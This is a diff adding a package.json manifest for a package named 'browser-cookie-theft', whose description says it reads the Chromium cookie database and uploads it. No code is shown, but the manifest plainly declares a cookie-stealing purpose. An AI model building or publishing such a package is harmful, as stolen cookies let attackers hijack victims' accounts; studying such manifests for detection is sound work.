@@ -1,0 +1,7 @@
+{
+  "name": "browser-cookie-theft",
+  "version": "1.0.0",
+  "description": "Reads Chromium cookie DB and uploads",
+  "main": "index.js",
+  "license": "MIT"
+}
